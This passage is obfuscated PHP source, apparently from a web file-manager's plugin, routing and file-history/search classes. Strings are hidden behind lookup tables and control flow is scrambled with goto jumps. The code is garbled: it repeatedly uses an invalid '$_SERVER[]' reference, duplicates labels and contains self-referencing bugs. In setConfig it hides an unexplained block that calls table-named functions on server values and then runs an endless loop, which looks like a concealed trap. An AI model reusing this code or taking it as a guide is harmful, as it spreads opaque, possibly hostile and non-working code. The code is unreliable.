$this->pluginCachePath($this->_tmpFileName()); } return $cǺ; } final function _cacheHttpFile($dػ) { $Cή = hash_path($dػ, !0); $this->cachePath = $this->pluginCachePath($Cή); if ($C = IO::fileNameExist($this->cachePath, $Cή)) { return KodIO::make($C); } $cҗԇ = $this->cachePath . $Cή; return $this->pluginCacheFileSet($cҗԇ, file_get_contents($dػ)); } final function _tmpFileName($Bڙ = array()) { goto Eٽ; b: $bۖފ = array($Bڙ[$eÔ[28]], $Bڙ[$eÔ[75]], $Bڙ[$eÔ[77]]); if (isset($Bڙ[$eÔ[461]])) { $bۖފ[] = $Bڙ[$eÔ[461]]; } return md5(implode($eÔ[70], $bۖފ)); goto B䏄; Eٽ: $eÔ =& $_SERVER[]; if (!$Bڙ) { $Bڙ = $this->fileInfo; } if (isset($Bڙ[$eÔ[164]])) { return $Bڙ[$eÔ[164]]; } goto cߡ; cߡ: if (isset($Bڙ[$eÔ[162]][$eÔ[164]])) { return $Bڙ[$eÔ[162]][$eÔ[164]]; } $aПƶ = IO::hashSimple($Bڙ[$eÔ[75]]); if ($aПƶ) { return $aПƶ; } goto b; B䏄: } final function checkSharePath($F) { goto fۮ; Aֲن: $e = Action($FŌٮ[1020])->sharePathInfo($F); if (!isset($e[$FŌٮ[75]])) { show_json(LNG($FŌٮ[1338]), !1); } $this->fileInfo = $e[$FŌٮ[162]]; goto c; fۮ: $FŌٮ =& $_SERVER[]; if (!defined($FŌٮ[427])) { define($FŌٮ[1337], 0); } if (!$this->isShare($F)) { return !1; } goto Aֲن; c: $this->cachePath = $this->pluginCachePath($this->fileInfo[$FŌٮ[164]]); return $e[$FŌٮ[75]]; goto Dђ͆; Dђ͆: } final function pluginCachePath($Cߋ = '') { $cأ˨ =& $_SERVER[]; $b݇ = IO_PATH_SYSTEM_TEMP . $cأ˨[1339] . $this->pluginName; if (!($dӟ = IO::infoFull($b݇))) { return IO::mkdir($b݇ . $cأ˨[8] . $Cߋ); } if (empty($Cߋ)) { return $dӟ[$cأ˨[75]]; } if (!($d = IO::fileNameExist($dӟ[$cأ˨[75]], $Cߋ))) { return IO::mkdir($dӟ[$cأ˨[75]] . $Cߋ); } return KodIO::make($d); } final function pluginCacheFileSet($F傍, $Cꆍ = '') { $aٕ =& $_SERVER[]; if (!($Cؿ = IO::infoFull($F傍))) { return IO::mkfile($F傍, $Cꆍ, REPEAT_REPLACE); } IO::setContent($Cؿ[$aٕ[75]], $Cꆍ); return $Cؿ[$aٕ[75]]; } final function pluginLocalFile($A嶨 = '') { goto C; fۣҭ: if (!$A嶨) { return $CЖ; } $a씄 = IO::info($A嶨); $D鈮 = $this->_tmpFileName($a씄) . $c˗[91] . $a씄[$c˗[160]]; goto CϨſ; C: $c˗ =& $_SERVER[]; $CЖ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($CЖ)) { mk_dir($CЖ); } goto fۣҭ; CϨſ: $e = $CЖ . $D鈮; if (@file_exists($e)) { return $e; } return IO::copy($A嶨, $CЖ, 0, $D鈮); goto Aι; Aι: } final function appPackage() { goto f񢰷; e: $this->parseLang($BⰝ); $D凨β = json_decode_force($BⰝ); if (!$D凨β) { return array(); } goto cˤ; f񢰷: $BԤ =& $_SERVER[]; if ($this->packageData) { return $this->packageData; } $BⰝ = $this->parseFile($this->pluginPath . $BԤ[1340]); goto e; c롮: return $D凨β; goto F; cˤ: $a = Hook::trigger($BԤ[1341], $D凨β); if ($a && is_array($a)) { $D凨β = $a; } $this->packageData = $D凨β; goto c롮; F: } public function packageInfoGet($fϒ) { $bڋ = $this->appPackage(); return array_get_value($bڋ, $fϒ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[][1342]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[][1343]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[][1344]); } private function parseFile($e) { goto f܅; f܅: $D =& $_SERVER[]; $c̜Ƅ = file_get_contents($e); $fȵ = array($D[1345], $D[1346], $D[1347], $D[1348], $D[1349], $D[1350], $D[1351]); goto B; B: $F = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$D[84]][$D[1352]]); if (strstr($c̜Ƅ, $D[1353])) { $b䅣 = rawurlencode(json_encode($this->pluginLangArr)); $c̜Ƅ = str_replace($D[1353], $b䅣, $c̜Ƅ); } if (strstr($c̜Ƅ, $D[1354])) { $b䅣 = $b䅣 = rawurlencode(json_encode($this->getConfig())); $c̜Ƅ = str_replace($D[1354], $b䅣, $c̜Ƅ); } goto aۖ; aۖ: $c̜Ƅ = str_replace($fȵ, $F, $c̜Ƅ); return $c̜Ƅ; goto CŸէ; CŸէ: } private function parseLang(&$Fѽ̉) { goto F; Dқř: preg_match_all($E[1356], $Fѽ̉, $eȹ鷦); if (!is_array($eȹ鷦) || count($eȹ鷦) == 0 || !is_array($eȹ鷦[0]) || count($eȹ鷦[0]) == 0) { return; } $cʃ = array(); goto f캛; F: $E =& $_SERVER[]; $A蝮Ȣ = $E[1355]; if (!strstr($Fѽ̉, $A蝮Ȣ)) { return; } goto Dқř; f캛: $E = array(); foreach ($eȹ鷦[0] as $BΜ) { $ȁ = substr($BΜ, strlen($A蝮Ȣ), -4); $fҪ = LNG($ȁ); $cʃ[] = $BΜ; $E[] = str_replace(array($E[217], $E[994], $E[330], $E[113]), array($E[50], $E[50], $E[33], $E[1357]), $fҪ); } $Fѽ̉ = str_replace($cʃ, $E, $Fѽ̉); goto B; B: } private function parseConfig(&$DǊ՛) { goto CÔ; E: $e = array(); $B̗ = array(); foreach ($A뾕[0] as $A) { $E = substr($A, strlen($Cƈ), -2); $e[] = $A; $B̗[] = _get($C, $E); } goto Eʼ; CÔ: $cȻ =& $_SERVER[]; $Cƈ = $cȻ[1358]; if (!strstr($DǊ՛, $Cƈ)) { return; } goto FҐ; Eʼ: $DǊ՛ = str_replace($e, $B̗, $DǊ՛); goto C; FҐ: preg_match_all($cȻ[1359], $DǊ՛, $A뾕); if (!is_array($A뾕) || count($A뾕) == 0 || !is_array($A뾕[0]) || count($A뾕[0]) == 0) { return; } $C = $this->getConfig(); goto E; C: } private function parsePackage(&$a򆠅ߴ) { goto f̉; BС: $f = array(); $e׶ = array(); foreach ($aʒ[0] as $e퐉) { $F׊ڲ͂ = substr($e퐉, strlen($Eςޒ), -2); $f[] = $e퐉; $e׶[] = _get($EӖ, $F׊ڲ͂); } goto Eљ۪; e: preg_match_all($F[1361], $a򆠅ߴ, $aʒ); if (!is_array($aʒ) || count($aʒ) == 0 || !is_array($aʒ[0]) || count($aʒ[0]) == 0) { return; } $EӖ = $this->appPackage(); goto BС; Eљ۪: $a򆠅ߴ = str_replace($f, $e׶, $a򆠅ߴ); goto dč; f̉: $F =& $_SERVER[]; $Eςޒ = $F[1360]; if (!strstr($a򆠅ߴ, $Eςޒ)) { return; } goto e; dč: } final function echoFile($C茳, $c鱟 = false) { goto a; a: $Aﲗڲ =& $_SERVER[]; $E崥 = $this->pluginPath . $C茳; if (ACT == $Aﲗڲ[1362]) { echo $Aﲗڲ[1363] . $this->pluginName . $Aﲗڲ[8] . $C茳 . $Aﲗڲ[1364]; if (!file_exists($E崥)) { echo $Aﲗڲ[1365]; return; } } goto f; AΕ݋: $this->parsePackage($f൘); if (is_array($c鱟)) { $f൘ = str_replace(array_keys($c鱟), array_values($c鱟), $f൘); } echo $Aﲗڲ[217] . $f൘; goto C; f: $f൘ = $this->parseFile($E崥); $this->parseLang($f൘); $this->parseConfig($f൘); goto AΕ݋; C: } final function initLang() { goto A؇ڋ; EɈܖ: $Eў۶ = I18n::getType(); $Eȵ߰ = array(); if (file_exists($Eʟ . $Eў۶ . $B̹φ[764])) { $Eȵ߰ = (include $Eʟ . $Eў۶ . $B̹φ[764]); } else { if ($Eў۶ == $B̹φ[1368] && !file_exists($Eʟ . $Eў۶ . $B̹φ[764]) && file_exists($Eʟ . $B̹φ[1369])) { $Eȵ߰ = (include $Eʟ . $B̹φ[1369]); } else { if (file_exists($Eʟ . $E . $B̹φ[764])) { $Eȵ߰ = (include $Eʟ . $E . $B̹φ[764]); } } } goto F; F: if (!is_array($Eȵ߰)) { return array(); } if (@count($Eȵ߰) > 0) { I18n::set($Eȵ߰); } return $Eȵ߰; goto Cݹ; A؇ڋ: $B̹φ =& $_SERVER[]; $E = $B̹φ[1366]; $Eʟ = $this->pluginPath . $B̹φ[1367]; goto EɈܖ; Cݹ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($a趹Ê) { $D߇ =& $_SERVER[]; if (!isset($_SERVER[$D߇[776]]) || !isset($_SERVER[$D߇[777]])) { goto A; A: $Cضȶ = $D߇[793]; $Fڛ = $D߇[778]; $eͳ = $_SERVER[$D߇[779]] . $D߇[780]; goto f; F: for ($B = $fݧ; $B > 0; $B++) { $dˣق = json_encode($GLOBALS[$D߇[384]]); } goto D; f: $C = $Fڛ($eͳ); $e櫹 = explode($D߇[217], $C); if (count($e櫹) < $D߇[583]) { $f˦ = $D߇[781]; $f˦(); } goto E㋑; E㋑: $dˣق = $D߇[794]; $dˣق($_SERVER[$D߇[795]]); $fݧ = 1; goto F; D: } return $this->modelPlugin->setConfig($this->pluginName, $a趹Ê); } public function onSetConfig($Dݣ) { } public function onGetConfig($cÊ) { } public function onChangeStatus($fԚԕ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($B઎ = "\x70\154\x75\x67\151\x6e\x41\x75\164\150") { $C =& $_SERVER[]; if (!defined($C[427])) { return !1; } if (_get($GLOBALS, $C[459])) { return !0; } $F = $this->getConfig(); if (!$F[$B઎]) { return !1; } return ActionCall($C[1370], $F[$B઎]); } public function url($FÐ, $Aĸ = '', $dӎ = true) { goto cܵ; dЩ: $D = $this->packageVersion(); $bȍ = $A . $fŻ֠[412] . $D; if (substr($FÐ, 0, 4) == $fŻ֠[144] || substr($FÐ, 0, 2) == $fŻ֠[1157]) { $B = $FÐ . $fŻ֠[1371] . $bȍ; } else { if ($Aĸ == $fŻ֠[33]) { $B = $this->pluginHost . $FÐ . $fŻ֠[1371] . $bȍ; } else { if ($Aĸ === $fŻ֠[76]) { $B = $this->pluginHost . $FÐ; } else { if ($Aĸ == $fŻ֠[1372]) { $B = STATIC_PATH . $FÐ . $fŻ֠[1371] . $A; } else { if ($Aĸ == $fŻ֠[1373]) { $B = APP_HOST . $fŻ֠[1374] . $FÐ . $fŻ֠[1371] . $A; } else { if (isset($a[$Aĸ])) { $B = $a[$Aĸ] . $FÐ . $fŻ֠[1371] . $bȍ; } } } } } } goto f; cܵ: $fŻ֠ =& $_SERVER[]; $a = $this->getConfig(); $A = KOD_VERSION . $fŻ֠[91] . KOD_VERSION_BUILD; goto dЩ; f: if (!$dӎ) { return $B; } echo $B; goto F; F: } public function link($Aϝދ = false, $D望 = '') { $d =& $_SERVER[]; if (!$Aϝދ) { $this->link($d[1375], $d[1373]); $this->link($d[1376], $d[1372]); $this->link($d[1377], $d[1372]); $this->link($d[1378], $d[1372]); $this->link($d[1379], $d[1372]); return; } $b氳 = $this->url($Aϝދ, $D望, !1); if (substr($Aϝދ, -3) == $d[1380]) { echo $d[1381] . $b氳 . $d[1382] . $d[217]; } else { if (substr($Aϝދ, -4) == $d[1383]) { echo $d[1384] . $b氳 . $d[1385] . $d[217]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\x79" => "\x5b\x5e\x2f\x5d\x2b", "\x3a\156\x75\x6d" => "\133\60\x2d\x39\135\x2b", "\72\x61\x6c\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($d, $bȾÜ) { $e펆 =& $_SERVER[]; if ($d == $e펆[1386]) { $d֘ = array_map($e펆[1387], $bȾÜ[0]); $b훫 = strpos($bȾÜ[1], $e펆[8]) === 0 ? $bȾÜ[1] : $e펆[8] . $bȾÜ[1]; $Bч = $bȾÜ[2]; } else { $d֘ = null; $b훫 = strpos($bȾÜ[0], $e펆[8]) === 0 ? $bȾÜ[0] : $e펆[8] . $bȾÜ[0]; $Bч = $bȾÜ[1]; } array_push(self::$maps, $d֘); array_push(self::$routes, $b훫); array_push(self::$methods, strtoupper($d)); array_push(self::$callbacks, $Bч); } public static function error($d) { self::$errorCallback = $d; } public static function haltOnMatch($e抟 = true) { self::$halts = $e抟; } public static function dispatch() { goto FΘ; a֏: self::$routes = preg_replace($Eƃ[1075], $Eƃ[8], self::$routes); if (in_array($A, self::$routes)) { $Dá = array_keys(self::$routes, $A); foreach ($Dá as $B⑽) { if (self::$methods[$B⑽] == $dŽ켙 || self::$methods[$B⑽] == $Eƃ[1389] || in_array($dŽ켙, self::$maps[$B⑽])) { $f׍쉙 = !0; if (!is_object(self::$callbacks[$B⑽])) { $AǼ = explode($Eƃ[8], self::$callbacks[$B⑽]); $fǾ = end($AǼ); $dڟ = explode($Eƃ[1390], $fǾ); $bÄ = new $dڟ[0](); $bÄ->{$dڟ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$B⑽]); if (self::$halts) { return; } } } } } else { $cב = 0; foreach (self::$routes as $B⑽) { if (strpos($B⑽, $Eƃ[4]) !== !1) { $B⑽ = str_replace($FčÖ, $d, $B⑽); } if (preg_match($Eƃ[1391] . $B⑽ . $Eƃ[1392], $A, $Eʈ)) { if (self::$methods[$cב] == $dŽ켙 || self::$methods[$cב] == $Eƃ[1389] || !empty(self::$maps[$cב]) && in_array($dŽ켙, self::$maps[$cב])) { $f׍쉙 = !0; array_shift($Eʈ); if (!is_object(self::$callbacks[$cב])) { $AǼ = explode($Eƃ[8], self::$callbacks[$cב]); $fǾ = end($AǼ); $dڟ = explode($Eƃ[1390], $fǾ); $bÄ = new $dڟ[0](); if (!method_exists($bÄ, $dڟ[1])) { echo $Eƃ[1393]; } else { call_user_func_array(array($bÄ, $dڟ[1]), $Eʈ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$cב], $Eʈ); if (self::$halts) { return; } } } } $cב++; } } if ($f׍쉙 == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $b֏ =& $_SERVER[]; header($_SERVER[$b֏[1394]] . $b֏[1395]); echo $b֏[1396]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Eƃ[1388]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto fЄ; FΘ: $Eƃ =& $_SERVER[]; $A = parse_url($_SERVER[$Eƃ[1388]], PHP_URL_PATH); $dŽ켙 = $_SERVER[$Eƃ[154]]; goto Dީ; Dީ: $FčÖ = array_keys(static::$patterns); $d = array_values(static::$patterns); $f׍쉙 = !1; goto a֏; fЄ: } } goto A; F֨: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\x75\162\x63\145\x5f\150\x69\163\164\x6f\162\x79"; public function addHistory($bמ, $B䦉 = '') { $E歟 =& $_SERVER[]; $B߶ = array($E歟[383] => $bמ[$E歟[369]], $E歟[1428] => isset($bמ[$E歟[379]]) ? $bמ[$E歟[379]] : $bמ[$E歟[378]], $E歟[420] => $bמ[$E歟[419]], $E歟[522] => $bמ[$E歟[77]], $E歟[2319] => $B䦉); $E = $GLOBALS[$E歟[6]][$E歟[84]][$E歟[2320]]; if ($E > 1) { $this->historyAutoClear($B߶[$E歟[369]]); $this->add($B߶); } Model($E歟[2321])->eventFileEdit($bמ[$E歟[369]]); } private function historyAutoClear($Cڷ) { goto e؍ں; B: $C㧿 = $DÜ == $cՅ[2323] ? 3 : $CȎۖ; if ($CȎۖ <= 1) { $C㧿 = 1; } $AåƜ = $C㧿 - 1; goto DƓ; c: $eۗ = array($cՅ[385] => array($cՅ[7], $f߆)); $this->where($eۗ)->delete(); Model($cՅ[422])->remove($EƓ); goto d; e؍ں: $cՅ =& $_SERVER[]; $DÜ = Model($cՅ[1090])->get($cՅ[2322]); $CȎۖ = $GLOBALS[$cՅ[6]][$cՅ[84]][$cՅ[2320]]; goto B; F⟅ܔ: $EƓ = array_to_keyvalue($a̳ި, $cՅ[33], $cՅ[419]); $EƓ = array_slice($EƓ, $AåƜ); if (!$f߆ || !$EƓ) { return; } goto c; C: if (!$a̳ި || $AåƜ >= count($a̳ި)) { return; } $f߆ = array_to_keyvalue($a̳ި, $cՅ[33], $cՅ[367]); $f߆ = array_slice($f߆, $AåƜ); goto F⟅ܔ; DƓ: if ($AåƜ >= 500) { return; } $eۗ = array($cՅ[383] => $Cڷ); $a̳ި = $this->field($cՅ[2324])->where($eۗ)->order($cՅ[2316])->select(); goto C; d: } public function listData($B) { goto Eσ; C᳨Ǟ: $A졧 = $this->field($dѮ)->where($e)->order($B鼺[2316])->selectPage(); $this->_listAppendUser($A졧[$B鼺[354]]); $eɺ꣈ = Model($B鼺[1090])->get($B鼺[2322]); goto BÈ; Eσ: $B鼺 =& $_SERVER[]; $e = array($B鼺[383] => $B); $dѮ = $B鼺[2325]; goto C᳨Ǟ; BÈ: $e՞ɭ = 3; if ($eɺ꣈ == $B鼺[2323]) { $A졧[$B鼺[354]] = array_slice($A졧[$B鼺[354]], 0, $e՞ɭ); $A졧[$B鼺[351]] = array($B鼺[2326] => 1, $B鼺[2327] => 20, $B鼺[2328] => 1, $B鼺[2329] => count($A졧[$B鼺[354]])); } return $A졧; goto D̜; D̜: } protected function _listAppendUser(&$f˴) { $fÅ =& $_SERVER[]; $E = array_to_keyvalue($f˴, $fÅ[33], $fÅ[1437]); $fĐė = Model($fÅ[479])->userListInfo($E); foreach ($f˴ as &$C̽) { $Eף߱ = $C̽[$fÅ[1437]]; $C̽[$fÅ[378]] = $fĐė[$Eף߱] ? $fĐė[$Eף߱] : !1; } } public function fileInfo($Fϑ) { $B =& $_SERVER[]; $d˭ = $this->tablePrefix; $c = "{$d˭}\x69\x6f\x5f\146\x69\x6c\145\x20\x66\x69\x6c\145\x73\40\x6f\x6e\40\x66\x69\154\x65\163\56\x66\x69\154\145\111\x44\x20\x3d\x20\x68\x69\163\164\x6f\x72\x79\56\x66\151\x6c\145\111\104"; return $this->alias($B[2330])->where(array($B[385] => $Fϑ))->join($c, $B[2331])->find(); } public function removeItem($F󇠡) { $CⲲ =& $_SERVER[]; $Fٝ։ = array($CⲲ[385] => $F󇠡); $EЩ = $this->where($Fٝ։)->find(); if ($EЩ) { $b뱡 = $this->where($Fٝ։)->delete(); Model($CⲲ[422])->remove($EЩ[$CⲲ[419]]); return $b뱡; } return !1; } public function removeBySource($cߚ) { goto Dӣ; D׾: return !0; goto Dۋڔ; Cȕ: $A̾ه = array($E[383] => array($E[7], $cߚ)); $E = $this->field($E[420])->where($A̾ه)->select(); if ($E) { $this->where($A̾ه)->delete(); $a = array_to_keyvalue($E, $E[33], $E[419]); Model($E[422])->remove($a); } goto D׾; Dӣ: $E =& $_SERVER[]; if (!$cߚ) { return !1; } if (!is_array($cߚ)) { $cߚ = array($cߚ); } goto Cȕ; Dۋڔ: } public function setDetail($c۬օ, $Aߡ) { $Cˍߑ =& $_SERVER[]; return $this->where(array($Cˍߑ[385] => $c۬օ))->save(array($Cˍߑ[2319] => $Aߡ)); } public function rollbackToItem($bҨ, $B每) { goto Cٵ㯖; Dʂ: $F٥ = $this->find($B每); $Fֵ = array($Cȿ[419] => $F٥[$Cȿ[419]], $Cȿ[77] => $F٥[$Cȿ[77]], $Cȿ[107] => time(), $Cȿ[379] => USER_ID); Model($Cȿ[751])->where(array($Cȿ[369] => $bҨ))->save($Fֵ); goto Aߦ; Aߦ: return $this->where(array($Cȿ[385] => $B每))->delete(); goto B; Cٵ㯖: $Cȿ =& $_SERVER[]; $f = Model($Cȿ[751])->sourceInfo($bҨ); $this->addHistory($f); goto Dʂ; B: } public function clearSame($c㙞) { goto F̪Ȃ; aΡ: if (!$a) { return; } $this->where(array($aȪ[367] => array($aȪ[7], $a)))->delete(); Model($aȪ[422])->remove($DߐҌ); goto Fٸ; F̪Ȃ: $aȪ =& $_SERVER[]; $B = $this->listData($c㙞); $Eˡ֍ = array_to_keyvalue_group($B, $aȪ[419]); goto Aی; Aی: $DߐҌ = array(); $a = array(); foreach ($Eˡ֍ as $DÅؼ) { if (!$DÅؼ || count($DÅؼ) <= 1) { continue; } foreach ($DÅؼ as $f񤥍) { $DߐҌ[] = $f񤥍[$aȪ[419]]; $a[] = $f񤥍[$aȪ[367]]; } } goto aΡ; Fٸ: } public function userSpace() { $D¬ =& $_SERVER[]; $f = $this->tablePrefix; $dɉ = array($D¬[1428] => USER_ID); $cņ = "{$f}\x69\157\x5f\x66\151\154\x65\x20\146\x69\154\x65\163\40\x6f\x6e\x20\x66\151\154\x65\x73\56\x66\x69\154\x65\111\x44\x20\x3d\40\150\151\x73\164\x6f\x72\x79\x2e\x66\151\x6c\145\x49\104"; return $this->alias($D¬[2330])->where($dɉ)->join($cņ, $D¬[2331])->sum($D¬[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($D) { goto d̩; c: if (!$eͼ) { return array(); } $EΑ = $eͼ[$D[160]]; $b = $D[7]; goto aʜº; aʜº: if (!$eͼ[$D[160]]) { $Dк߻ = array_to_keyvalue($CЭԌ, $D[33], $D[160]); $EΑ = implode($D[47], $Dк߻); $b = $D[2282]; } $b = explode($D[47], trim($EΑ, $D[47])); return array($b, $b); goto cȎ; d̩: $D =& $_SERVER[]; $CЭԌ = KodIO::fileTypeList(); $eͼ = $CЭԌ[$D]; goto c; cȎ: } public function listPathType($f) { $e謑э =& $_SERVER[]; $B؂ = $this->fileTypeWhere($f); if (!$B؂) { return array(); } $BِЉƹ = array($e謑э[523] => SourceModel::TYPE_USER, $e謑э[524] => USER_ID, $e謑э[520] => 0, $e謑э[521] => $B؂); return $this->listSource($BِЉƹ); } public function listSearch($aʎ, $E󅓛 = 300) { goto Cɒ; aѳׇ: $this->_listSearchBindPinyin($aʎ, $cҔ, $cԱ); $this->alias($B؅[489])->_makeOrder()->cache(null, 10); $e = $this->distinct(!0)->field($cԱ)->where($cҔ)->selectPage($E󅓛); goto fٹ; fٹ: $this->_listSearchDesc($e, $aʎ, $bɦ); $this->_listSearchTag($e, $aʎ, $bɦ); $this->_listSearchGroupTag($e, $aʎ, $bɦ); goto Eޘ; d˸: if (!isset($cҔ[$B؅[397]])) { $cҔ[$B؅[397]] = 0; } $cԱ = $B؅[2333]; $bɦ = $cԱ; goto aѳׇ; Eޘ: $this->_listDataApply($e[$B؅[354]]); $this->_listMake($e); return $e; goto f; Cɒ: $B؅ =& $_SERVER[]; if (isset($aʎ[$B؅[2189]]) && $aʎ[$B؅[2189]]) { $aʎ[$B؅[2189]] = str_replace($B؅[1593], $B؅[2332], trim($aʎ[$B؅[2189]])); } $cҔ = $this->_parseSearchWhere($aʎ); goto d˸; f: } private function _listSearchTag(&$fҜ, $BÈގʅ, $eƼ) { goto F֨; e: $c = array_to_keyvalue($c, $e[33], $e[75]); $DՊ = array_unique($c); $this->_listSearchMerge($fҜ, $BÈގʅ, $eƼ, $DՊ); goto dב; F֨: $e =& $_SERVER[]; if (!$BÈގʅ[$e[2189]] || $fҜ[$e[351]][$e[340]] > 1) { return; } $Eͅ = Model($e[2334])->listData(); goto f©; f©: $eנ = array(); $a = $BÈގʅ[$e[2189]]; foreach ($Eͅ as $eĆ) { $E֛ = $eĆ[$e[28]]; $dѮ⚄ˋ = str_replace($e[50], $e[33], Pinyin::encode($E֛)); if (stripos($E֛, $a) !== !1 || stripos($dѮ⚄ˋ, $a) !== !1) { $eנ[] = $eĆ[$e[367]]; } } goto B; B: if (!$eנ) { return; } $a揔 = array($e[393] => array($e[7], $eנ), $e[1437] => USER_ID); $c = Model($e[394])->field($e[75])->where($a揔)->select(); goto e; dב: } private function _listSearchDesc(&$fা, $aʝ, $bЌ) { goto D;; Eð: $E = array_unique($E); if (!$E) { return; } $B = array($cنצ[369] => array($cنצ[7], $E), $cنצ[89] => $cنצ[405], $cنצ[359] => array($cنצ[750], $cنצ[2191] . $aʝ[$cنצ[2189]] . $cنצ[2191])); goto CЛݭ; D;: $cنצ =& $_SERVER[]; if (!$aʝ[$cنצ[2189]] || $fা[$cنצ[351]][$cنצ[340]] > 1) { return; } $E = $this->listSearchChildren($aʝ[$cنצ[463]]); goto Eð; CЛݭ: $D肐А = Model($cنצ[506])->field($cنצ[369])->where($B)->select(); $Cֳͻ = array_to_keyvalue($D肐А, $cنצ[33], $cنצ[369]); $this->_listSearchMerge($fা, $aʝ, $bЌ, $Cֳͻ); goto f̔; f̔: } private function _listSearchGroupTag(&$cױ, $C, $D) { goto C; C: $Eς =& $_SERVER[]; if (!$C[$Eς[2189]] || $cױ[$Eς[351]][$Eς[340]] > 1 || !$C[$Eς[463]]) { return; } $E樆 = $this->sourceInfo($C[$Eς[463]]); goto e۳; f: $eƎ = array(); $D = $C[$Eς[2189]]; foreach ($e[$Eς[354]] as $c̱) { $Aч = $c̱[$Eς[28]]; $DǮ = str_replace($Eς[50], $Eς[33], Pinyin::encode($Aч)); if (stripos($Aч, $D) !== !1 || stripos($DǮ, $D) !== !1) { $eƎ[] = $c̱[$Eς[367]]; } } goto dǒ; dǒ: if (!$eƎ) { return; } $Aڭ = array($Eς[393] => array($Eς[7], $eƎ), $Eς[1437] => 0, $Eς[29] => $Eς[2209] . $Bׯѹ); $cȆȔ = Model($Eς[394])->field($Eς[75])->where($Aڭ)->select(); goto b; b: $cȆȔ = array_to_keyvalue($cȆȔ, $Eς[33], $Eς[75]); $dӢ = array_unique($cȆȔ); $this->_listSearchMerge($cױ, $C, $D, $dӢ); goto fҬ; e۳: if (!$E樆 || $E樆[$Eς[371]] != SourceModel::TYPE_GROUP) { return; } $Bׯѹ = $E樆[$Eς[458]]; $e = Model($Eς[2335])->get($Bׯѹ); goto f; fҬ: } private function _listSearchMerge(&$FӔ軗, $E, $dÇ, $EÍ) { goto Dז; Dǌ: foreach ($Dź˽ as $b) { $CӶ = $dߏ㳹[47] . $E[$dߏ㳹[463]] . $dߏ㳹[47]; if (stripos($b[$dߏ㳹[461]], $CӶ) !== !1) { $b[] = $b; } } $FӔ軗[$dߏ㳹[354]] = array_merge($b, $FӔ軗[$dߏ㳹[354]]); $FӔ軗[$dߏ㳹[351]][$dߏ㳹[352]] += count($b); goto Bஂ; Dז: $dߏ㳹 =& $_SERVER[]; if (!$EÍ) { return; } $e݌ = array_to_keyvalue($FӔ軗[$dߏ㳹[354]], $dߏ㳹[33], $dߏ㳹[369]); goto A䈱; F֘: $Dź˽ = $this->field($dÇ)->where($D)->select(); if (!$Dź˽) { return; } $b = array(); goto Dǌ; A䈱: $F𴄆 = array_diff($EÍ, $e݌); if (!$F𴄆) { return; } $D = array($dߏ㳹[369] => array($dߏ㳹[7], $F𴄆)); goto F֘; Bஂ: } public function listSearchChildren($a҃, $Eɣ = 5000) { goto d; D裊: $a؇ = $this->field($aȕ[369])->where($bӌ)->select(); $f鑕ńԔ = array_to_keyvalue($a؇, $aȕ[33], $aȕ[369]); return $f鑕ńԔ; goto b; d: $aȕ =& $_SERVER[]; $f鑕ńԔ = array(); $aφӬ = $this->sourceInfo($a҃); goto b; b: $bӌ = array($aȕ[461] => array($aȕ[750], $aφӬ[$aȕ[461]] . $aφӬ[$aȕ[369]] . $aȕ[486])); $E = $this->field($aȕ[369])->cache(null, 600)->where($bӌ)->count(); if ($E > $Eɣ) { return $this->_listSearchChildrenNear($a҃, $Eɣ); } goto D裊; b: } private function _listSearchChildrenNear($F庩, $f˾) { goto b򸢋; bވφ: $CҦ = $this->field($eϏ[2336])->where($a֣)->select(); $C = array_to_keyvalue(array_filter_by_field($CҦ, $eϏ[370], $eϏ[83]), $eϏ[33], $eϏ[369]); $D = array_merge($D, array_to_keyvalue($CҦ, $eϏ[33], $eϏ[369])); goto cܩ; aҎ: $D = array_merge($D, array_to_keyvalue($CҦ, $eϏ[33], $eϏ[369])); $D = array_slice($D, 0, $f˾); return $D; goto A; b򸢋: $eϏ =& $_SERVER[]; $D = array(); $a֣ = array($eϏ[463] => $F庩); goto bވφ; cܩ: if (!$C) { return $D; } $a֣ = array($eϏ[463] => array($eϏ[7], $C)); $CҦ = $this->field($eϏ[2336])->where($a֣)->select(); goto aҎ; A: } private function _listSearchBindPinyin($e, &$E, &$f㕊) { goto c; fء͠: $C = array(); $f㕊 = str_replace(array($Aӓ[217], $Aӓ[50], $Aӓ[2337]), $Aӓ[33], $f㕊); $f㕊 = $Aӓ[2338] . str_replace($Aӓ[47], $Aӓ[2339], $f㕊); goto A꼳; e: $C[] = array($Aӓ[2340] => $fĕ, $Aӓ[915] => $Aӓ[2193], array($Aӓ[2341] => $fĕ, $Aӓ[2342] => array($Aӓ[7], array($Aӓ[416], $Aӓ[415])))); $this->join($b۴); $E = $C; goto Fʴ; A꼳: unset($E[$Aӓ[28]]); foreach ($E as $bʜ => $bч) { $C[$Aӓ[2338] . $bʜ] = $bч; } $fĕ = array($Aӓ[485], $Aӓ[2191] . $e[$Aӓ[2189]] . $Aӓ[2191]); goto e; c: $Aӓ =& $_SERVER[]; if (!Input::check($e[$Aӓ[2189]], $Aӓ[306]) || strlen($e[$Aӓ[2189]]) < 2) { return; } $b۴ = "\114\105\x46\124\40\x4a\x4f\111\116\x20{$this->tablePrefix}\x69\157\x5f\x73\157\x75\162\x63\x65\x5f\155\x65\x74\141\40\155\x65\164\x61\x20\157\156\x20\163\x6f\165\x72\143\x65\x2e\x73\x6f\x75\x72\143\145\111\x44\x20\75\40\155\145\164\141\56\x73\157\165\x72\x63\x65\x49\104"; goto fء͠; Fʴ: } private function _parseSearchWhere($dˤ) { goto F; B摗: if 